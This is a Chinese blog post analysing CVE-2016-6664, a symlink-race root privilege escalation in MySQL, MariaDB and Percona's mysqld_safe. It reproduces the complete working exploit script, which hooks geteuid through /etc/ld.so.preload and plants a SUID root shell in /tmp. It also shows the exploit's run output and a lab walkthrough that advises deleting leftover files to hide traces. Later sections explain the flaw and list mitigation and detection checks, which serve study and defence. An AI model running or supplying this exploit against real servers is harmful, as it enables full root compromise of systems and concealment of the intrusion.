# MySQL-based databases CVE-2016-6664 本地提权 - dlive - 博客园

> 原文：[`www.cnblogs.com/dliv3/p/6412653.html`](https://www.cnblogs.com/dliv3/p/6412653.html)

@date: 2016/11/10

@author: dlive

## 0x00 前言

这个漏洞可以结合 CVE-2016-6663 使用提升权限到 root

## 0x01 漏洞原文

```
# http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html
=============================================
- Release date: 01.11.2016
- Discovered by: Dawid Golunski
- Severity: High/Critical
- CVE-2016-6664 / (Oracle) CVE-2016-5617
- http://legalhackers.com
=============================================

I. VULNERABILITY
-------------------------

MySQL / MariaDB / Percona   -   Root Privilege Escalation

MySQL  
	<= 5.5.51
	<= 5.6.32
	<= 5.7.14

MariaDB
	All current

Percona Server
	< 5.5.51-38.2
	< 5.6.32-78-1
	< 5.7.14-8

Percona XtraDB Cluster
	< 5.6.32-25.17
	< 5.7.14-26.17
	< 5.5.41-37.0

III. INTRODUCTION
-------------------------

MySQL-based databases including MySQL, MariaDB and Percona are affected
by a privilege escalation vulnerability which can let attackers who have
gained access to mysql system user to further escalate their privileges
to root user allowing them to fully compromise the system.
The vulnerability stems from unsafe file handling of error logs and
other files.
基于 MySQL 的数据库，包括 MySQL,MariaDB,Percona 都受到 CVE-2016-6664 的影响。
该漏洞可以使已经拥有 mysql 系统用户权限的攻击者提升到 root 权限。
该漏洞是因为 MySQL 对 error logs 和其他文件的不安全操作导致的

IV. DESCRIPTION
-------------------------

The error.log file on most default installations of MySQL/Percona/MariaDB
databases is stored either in /var/log/mysql or /var/lib/mysql directory.
MySQL/Percona/MariaDB 安装后，error.log 文件默认放置在/var/log/mysql 或者/var/lib/mysql 文件夹中。

The permissions on the file and directory look as follows:
相关文件和文件夹的权限如下所示：

root@trusty:/var/lib/mysql# ls -la /var/log/mysql
total 468
drwxr-s---  2 mysql adm      4096 Sep 11 06:25 .
drwxrwxr-x 36 root  syslog   4096 Sep 11 06:25 ..
-rw-r-----  1 mysql adm         0 Sep 11 06:25 error.log

root@trusty:/var/lib/mysql# ls -lad /var/log/mysql
drwxr-s--- 2 mysql adm 4096 Sep 11 06:25 /var/log/mysql

mysqld_safe wrapper that is normally used for starting MySQL daemon and 
creating/reopening the error.log performs certain unsafe file operations that
may allow attackers to gain root privileges.
mysqld_safe wrapper 通常用于启动 mysql 守护进程和新建/打开 error.log。
在这个过程中 mysql_safe 进行了不安全的文件操作，导致攻击者可获得 root 权限。

The wrapper script contains a 'while' loop shown below which monitors the mysqld 
process and performs a restart in case of the process failure.  
The restart involves re-creation of the error.log file if syslog logging has
not been configured instead of error log files (file-based logging is the 
default setting on most installations).
mysqld_safe wrapper 脚本包含了一个 while 循环(如下所示)，这个循环监视 mysqld 进程，如果进程挂掉了该循环负责重启进程。
重启过程中，如果发现配置没有使用 syslog 替代 error.log 文件，则会重新创建 error log 文件。（大部分情况下数据库安装后默认配置是基于文件的日志，即没有使用 syslog）
--------[ mysqld_safe ]--------
[...]

while true
do
  rm -f "$pid_file"     # Some extra safety

  start_time=`date +%M%S`

  eval_log_error "$cmd"

  if [ $want_syslog -eq 0 -a ! -f "$err_log" ]; then
    touch "$err_log"                    # hypothetical: log was renamed but not
    chown $user "$err_log"              # flushed yet. we'd recreate it with
    chmod "$fmode" "$err_log"           # wrong owner next time we log, so set
  fi                                    # it up correctly while we can!

[...]

-------------------------------

As can be seen, the error.log file is created (touch) and chowned to the user
running the mysqld daemon (typically 'mysql'). 
可以看到，error.log 文件被创建(touch)然后使用 chown 将 error.log 文件所有者修改为运行 mysql 进程的用户（一般为 mysql）

The operation is vulnerable to a symlink attack.
这个操作很容易受到符号链接攻击。

Attackers who obtained access to mysql account, through CVE-2016-6663
vulnerability described at:
攻击者可以通过 CVE-2016-6663 获得 mysql 权限

http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html

would gain access to /var/log or /var/lib/mysql directories (owned by mysql user) 
and could therefore easily remove the error.log file and replace it 
with a symlink to an arbitrary system file and escalate privileges.
拥有 mysql 权限后，攻击者可以访问/var/log 和/var/lib/mysql 目录，并且可以删除 error.log 并将其替换成指向任意文件的符号链接，进而进行提权。

The privilege escalation could be triggered instantly (without the need to wait
for mysql service restart/reboot) by attackers having 'mysql' account by simply 
killing the mysqld child process (launched by the mysqld_safe wrapper).
无需等待 mysql service 重启，攻击者只需要通过 mysql 用户杀死由 mysqld_safe 创建的 mysqld 的子进程，就可以触发这个权限升级。

When the mysqld process gets terminated, the wrapper will then re-itertate the 
loop shown above and immediately create a mysql-owned file in the location 
specified by the attacker in the symlink thus allowing attackers to quickly
escalate their privileges.
当 mysqld 进程被终止，mysqld_safe 将会执行 while 循环，并创建一个属于 mysql 用户的文件在攻击者指定的位置（通过符号链接指向），进而进行提权。

V. PROOF OF CONCEPT EXPLOIT
-------------------------

-------[ mysql-chowned.sh ]------
见 0x02 漏洞利用代码分析
------------EOF------------------

Example run
​~~~~~~~~~~~~~~~~

mysql_suid_shell.MYD-4.3$ whoami
mysql

omysql_suid_shell.MYD-4.3$ dpkg -l | grep percona-server-server
iU  percona-server-server              5.6.32-78.0-1.xenial              amd64        Percona Server database server
iF  percona-server-server-5.6          5.6.32-78.0-1.xenial              amd64        Percona Server database server binaries

mysql_suid_shell.MYD-4.3$ ./mysql-chowned.sh /var/lib/mysql/xenial-percona.err 

MySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit 
mysql-chowned.sh (ver. 1.0)

CVE-2016-6664 / CVE-2016-5617

Discovered and coded by: 

Dawid Golunski 
http://legalhackers.com 

[+] Starting the exploit as 
uid=1001(attacker) gid=1001(attacker) euid=107(mysql) groups=1001(attacker)

[+] Target MySQL log file set to /var/lib/mysql/xenial-percona.err

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 mysql attacker 1037528 Nov  1 05:08 /tmp/mysqlrootsh

[+] Symlink created at: 
lrwxrwxrwx 1 mysql attacker 18 Nov  1 05:08 /var/lib/mysql/xenial-percona.err -> /etc/ld.so.preload

[+] Waiting for MySQL to re-open the logs/MySQL service restart...
Do you want to kill mysqld process to instantly get root? :) ? [y/n] y
Got it. Executing 'killall mysqld' now...

[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: 
-rw-r----- 1 mysql root 19 Nov  1 05:08 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 1037528 Nov  1 05:08 /tmp/mysqlrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 1037528 Nov  1 05:08 /tmp/mysqlrootsh

Got root! The database server has been ch-OWNED !

[+] Spawning the rootshell /tmp/mysqlrootsh now! 

mysqlrootsh-4.3# whoami
root

mysqlrootsh-4.3# exit
exit

[+] Cleaning up...

[+] Job done. Exiting with code 0

VI. BUSINESS IMPACT
-------------------------

Although the severity of this issue is lower on its own (attackers need to
gain access to mysql system user), the vulnerability could easily be combined 
with the CVE-2016-6663 issue.
The combination of the two would effectively allow low privileged local 
database users to escalate their system privileges to root system account and 
allow them to fully compromise the server which increases the severity of this
issue.

VIII. SOLUTION
-------------------------
作者没有给出明确修补方式，只是说明数据库厂商会为该漏洞打补丁。 
```

## 0x02 漏洞利用代码分析

[`legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh`](http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh)

```
#!/bin/bash -p 
#必须加上 -p 否则 suid 不会生效
#
# MySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit
# mysql-chowned.sh (ver. 1.1)
#
# CVE-2016-6664 / CVE-2016-5617
#
# Discovered and coded by:
#
# Dawid Golunski
# dawid[at]legalhackers.com
#
# https://legalhackers.com
#
# Follow https://twitter.com/dawid_golunski for updates on this advisory.
#
# This PoC exploit allows attackers to (instantly) escalate their privileges
# from mysql system account to root through unsafe error log handling.
# 攻击者可以通过这个 poc 攻击不安全的 error log 处理过程从 mysql 权限提升到 root 权限
# The exploit requires that file-based logging has been configured (default).
# 成功攻击需要受害者主机配置的是基于文件的日志(即默认配置)
# To confirm that syslog logging has not been enabled instead use:
# grep -r syslog /etc/mysql
# which should return no results.
# 保证 syslog 日志未被启用, 如果 grep -r syslog /etc/mysql 无返回结果则表示未被启用
#
# This exploit can be chained with the following vulnerability:
# CVE-2016-6663 / CVE-2016-5616
# which allows attackers to gain access to mysql system account (mysql shell).
# 这个漏洞可以和 CVE-2016-6663 结合使用，6663 可以使攻击者获得 mysql 系统用户权限
#
# In case database server has been configured with syslog you may also use:
# CVE-2016-6662 as an alternative to this exploit.
# 如果数据库服务器已经使用了 syslog，你可以使用 CVE-2016-6662 获取 root 权限
#
# Usage:
# ./mysql-chowned.sh path_to_error.log 
#
#
# See the full advisory for details at:
# https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html
#
# Video PoC:
# https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html
#
#
# Disclaimer:
# For testing purposes only. Do no harm.

BACKDOORSH="/bin/bash"	#bash shell
BACKDOORPATH="/tmp/mysqlrootsh" #backdoor 文件路径
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
	# Cleanup 
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $ERRORLOG
	touch $ERRORLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Ctrl+C pressed"
	cleanexit 0
}

#intro 
#介绍信息
echo -e "\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"

# Args
# usage
if [ $# -lt 1 ]; then
	echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"
	echo -e "It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n"
	exit 3
fi

# Priv check
# 检查运行脚本的用户是否是 mysql
echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"
id | grep -q mysql 
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as mysql user! Exiting.\n"
	exit 3
fi

# Set target paths
# error log 路径
ERRORLOG="$1"
if [ ! -f $ERRORLOG ]; then
	echo -e "\n[!] The specified MySQL error log ($ERRORLOG) doesn't exist. Try again.\n"
	exit 3
fi
echo -e "\n[+] Target MySQL log file set to $ERRORLOG"

# [ Active exploitation ]

trap ctrl_c INT
# Compile privesc preload library
# 编译库文件
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		//修改 mysqlrootsh owner 和 group 为 root
		chown("$BACKDOORPATH", 0, 0);
		//修改 mysqlrootsh 权限为 04777
		chmod("$BACKDOORPATH", 04777);
		//unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi

# Prepare backdoor shell
# 将/bin/bash 拷贝到/tmp/mysqlrootsh
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
# 如果已经存在/etc/ld.so.preload，为了不破坏主机原本环境，脚本自动退出
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	exit 2
fi

# Symlink the log file to /etc
# 删除 error.log，新建 error.log 符号链接，链接到/etc/ld.so.preload
rm -f $ERRORLOG && ln -s /etc/ld.so.preload $ERRORLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $ERRORLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] Symlink created at: \n`ls -l $ERRORLOG`"

# Wait for MySQL to re-open the logs
echo -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"
echo -ne "\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"
echo -n "Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "
read THE_ANSWER
if [ "$THE_ANSWER" = "y" ]; then
	echo -e "Got it. Executing 'killall mysqld' now..."
	killall mysqld
fi
while :; do 
	sleep 0.1
	if [ -f /etc/ld.so.preload ]; then
		# 将"/tmp/privesclib.so"写入/etc/ld.so.preload
		echo $PRIVESCLIB > /etc/ld.so.preload
		# 删除 errorlog
		rm -f $ERRORLOG
		break;
	fi
done

# /etc/	dir should be owned by mysql user at this point
# Inject the privesc.so shared library to escalate privileges
# 将"/tmp/privesclib.so"写入/etc/ld.so.preload
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"

# sudo 是一个 suid 程序，会调用 geteuid 函数，该函数已经被/tmp/privesclib.so 中的 geteuid 覆盖掉
# 所以 sudo 会调用攻击者自定义的 geteuid
# /tmp/privesclib.so 中的 geteuid 会将/tmp/mysqlrootsh 的权限改为 04777
sudo 2>/dev/null >/dev/null

# Check for the rootshell
# 检查是否拿到了 rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"
else
	echo -e "\n[!] Failed to get root"
	cleanexit 2
fi

# Execute the rootshell
# 执行 rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
# 删除漏洞利用过程中产生的文件
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
$BACKDOORPATH -p -i

# Job done.
cleanexit 0 
```

## 0x03 漏洞验证

MySQL Poc:

[`legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh`](http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh)

漏洞成功利用的条件:

1.  MySQL-based 数据库版本符合条件
2.  攻击者已经获得 mysql 系统用户权限
3.  mysql 错误日志使用默认基于文件的配置，未使用 syslog

实验环境:

1.  系统: Debian 4.0.4-1 kali2 x86_64
2.  MySQL 版本: 5.5.47

环境准备：

1.  检查系统 MySQL 版本：

![](img/0b206d66dc79eb37b9688f9825dc94ab.png)

2.  检查 MySQL 是否配置了使用 syslog:

![](img/e0fba1282ac92736c18d54677772721a.png)

3.  kali 系统上预装的 MySQL 的错误日志是使用 syslog 的，需要将这个配置去掉(需要 root 权限)，将 mysqld_safe_syslog.conf 中的 syslog 删除后保存，如下图所示

```
vim /etc/mysql/conf.d/mysqld_safe_syslog.cnf 
```

![](img/6078579b5f17cebaef248c45fa00437d.png)

​ 重启 mysql 服务

```
mysqld_safe --user=mysql 
```

漏洞利用:

查看 error log 文件的位置（默认是在 mysql 的数据目录下, debian 上为/var/lib/mysql/hostname.err）

![](img/ab7cda03ec4ed5e313af1d218e8d2a07.png)

需要先通过 CVE-2016-6663 获得 mysql 系统用户的 shell，然后指定 error log 文件位置并运行提权脚本

![](img/d1b367747d4c9e51aaec47768167e76f.png)

成功获得 root 权限：

![](img/0bcba416a77cffb9f8bd702ebfda4e7d.png)

清理痕迹: 脚本只删除了 ld.so.preload 和/tmp/privesclib.so，注意把/tmp/privesclib.c 也删了

ps. 不知道为什么漏洞利用成功后服务器上的 MySQL 挂了，需要手动重启，提权前最好看一下服务器上原来是以什么配置启动的 mysql（ps aux | grep mysql），若提权过程中导致 mysql 服务器挂掉可以以同样配置启动

## 0x04 漏洞利用过程总结

### 1\. ld.so.preload

要理解这个漏洞的利需要首先了解/etc/ld.so.preload 这个文件的作用。

这个文件的作用和 LD_PRELOAD 这个环境变量的作用类似：

用以指定预先装载的一些共享库或目标文件，且无论程序是否依赖这些共享库或者文件，指定的这些文件都会被装载。但是两者的区别在于 LD_PRELOAD 被做了限制，对于 suid 的程序这种预先装载目标库的功能可能会导致权限提升，所以对于 suid 的程序加载动态链接库时是会忽略 LD_PRELOAD 的。但是/etc/ld.so.preload 这个配置文件却不存在这种限制。

```
# 参考资料 4(https://minipli.wordpress.com/2009/07/17/ld_preload-vs-etcld-so-preload/)中是这么说的:
LD_PRELOAD was evil when combined with suid binaries so it will be ignored by the loader. That’s because otherwise you could abuse those binaries to raise your privileges by preloading some code that spawns a shell — e.g. by hooking __libc_start_main(). However, those restrictions do not apply for this file(/etc/ld.so.preload). The loader will bravely load the shared objects listed in /etc/ld.so.preload even for suid binaries. 
```

在此漏洞利用过程中 ld.so.preload 文件中的内容为攻击者自己编译的 so 文件: /tmp/privesclib.so

攻击者在/tmp/privesclib.so 中自定义了 geteuid 函数，这个函数会在 suid 的程序(如 sudo)中被调用

```
strace -o sudo.txt sudo 
```

![](img/f4e91e539ebd442ff0c24e73611a9e83.png)

攻击者设置预先加载其定义 so 库，会导致 geteuid 函数被覆盖掉，当 sudo 调用 geteuid 时实际上调用的是攻击者自定义函数，可以达到一种类似 hook 的效果。

/etc 目录只有 root 可写，所以要借助 mysqld_safe 进程创建 ld.so.preload 文件(mysqld_safe 进程是以 root 权限运行的)

### 2.漏洞利用过程

简单梳理一下漏洞利用过程，主要分为一下几步：（可以结合 poc 一起看会比较清晰）

1.  准备工作：
    1.  cp /bin/bash /tmp/mysqlrootsh
    2.  编译攻击者自定义 so
2.  删除 error.log（需要 mysql 权限），并新建符号链接 ln -s /etc/ld.so.preload /var/log/mysql/error.log , error.log 为符号链接文件，指向一个现在不存在的 ld.so.preload 文件（这种情况下判断 error.log 是否存在，结果是不存在的，并且 touch error.log 的结果是新建一个 ld.so.preload 文件）
3.  杀掉 mysqld 进程，mysqld_safe 检测到 mysqld 进程死掉了，会重启它，在重启的过程中检查 error.log 是否存在，因为刚刚 error.log 被换为了符号链接，所以 mysqld_safe 认为其不存在，然后 touch error.log，结果攻击者成功借助 mysqld_safe 的 root 权限新建了 ld.so.preload 文件
4.  mysqld_safe 进程执行 chown mysql error.log ,因为 error.log 是符号链接，所以 ld.so.preload 的 owner 被改为 mysql
5.  echo '/tmp/privesclib.so' > /etc/ld.so.preload (攻击者有 mysql 权限，并且 ld.so.preload 的 owner 为 mysql)
6.  执行 sudo, geteuid 被调用，/tmp/mysqlrootsh 权限的 owner 和 group 被改为 root, 权限被改为 04777
7.  执行 mysqlrootsh 拿到 root 权限

## 0x05 漏洞/利用模型抽象

漏洞原因用一句话总结就是:

root 权限进程对文件进行敏感操作（touch/chown），被操作文件可被攻击者(非 root 用户)访问并换为攻击者可控文件(符号链接)，攻击者精心构造文件获得 root 权限

## 0x06 应急相应

1.  该漏洞的利用建立在 CVE-2016-6663 的基础之上，所以建议修补 6663 漏洞防止攻击者进一步对服务器造成危害。

2.  短期内可使用 syslog 代替默认的 error log，等待官方补丁

攻击检测：

1.  检查 mysql 版本是否在存在漏洞的版本范围内
2.  查看 mysql 是否开启 syslog
3.  检测是否存在/etc/ld.so.preload,/tmp/privesclib.so,/tmp/privesclib.c, /tmp/mysqlrootsh 等文件

## 0x07 参考资料

1.  漏洞原文

    [`legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html`](http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html)

2.  MySQL 错误日志

    [`blog.csdn.net/leshami/article/details/39759849`](http://blog.csdn.net/leshami/article/details/39759849)

3.  Linux 平台 LD_PRELOAD 及其机制的一种技术

    [`www.tuicool.com/articles/aqERfi`](http://www.tuicool.com/articles/aqERfi)

4.  LD_PRELOAD vs. /etc/ld.so.preload

    [`minipli.wordpress.com/2009/07/17/ld_preload-vs-etcld-so-preload/`](https://minipli.wordpress.com/2009/07/17/ld_preload-vs-etcld-so-preload/)

5.  UNIX 下的 LD_PRELOAD 变量

    [`blog.chinaunix.net/uid-13344516-id-79188.html`](http://blog.chinaunix.net/uid-13344516-id-79188.html)